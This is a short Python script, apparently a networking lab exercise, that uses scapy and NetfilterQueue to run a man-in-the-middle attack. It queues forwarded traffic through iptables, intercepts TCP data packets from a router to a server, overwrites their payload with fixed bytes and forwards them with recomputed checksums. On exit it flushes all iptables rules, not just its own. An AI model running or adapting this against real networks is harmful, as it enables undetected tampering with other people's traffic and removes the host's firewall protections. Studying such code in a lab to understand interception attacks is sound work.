from scapy.all import *
from netfilterqueue import NetfilterQueue as NFQ
import os

def detect_and_alter(p):
    octets=p.get_payload()
    scapy_packet=IP(octets)

    ip_router="198.7.0.1"
    ip_server="198.7.0.2"

    if scapy_packet.haslayer(IP) and scapy_packet.haslayer(TCP) and scapy_packet[IP].src==ip_router and scapy_packet[IP].dst==ip_server and scapy_packet[TCP].flags=='PA':
        print("IP Sursa: ",scapy_packet[IP].src)
        print("IP Destinatie:",scapy_packet[IP].dst)
        print("Pachet interceptat: ",scapy_packet.summary())

        scapy_packet=alter_packet(scapy_packet)
        octets=bytes(scapy_packet)
        p.set_payload(octets)
    p.accept()

def alter_packet(p):
    mesaj=b"abcde"
    p[TCP].payload=Packet(struct.pack('!{}s'.format(len(mesaj)),mesaj))
    print("Ack = ",p[TCP].ack)
    print("Seq = ",p[TCP].seq)

    del p[IP].chksum
    del p[TCP].chksum
    return p

queue=NFQ()
try:
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num 10")
    queue.bind(10,detect_and_alter)
    queue.run()
except KeyboardInterrupt:
    os.system("iptables --flush")
    queue.unbind()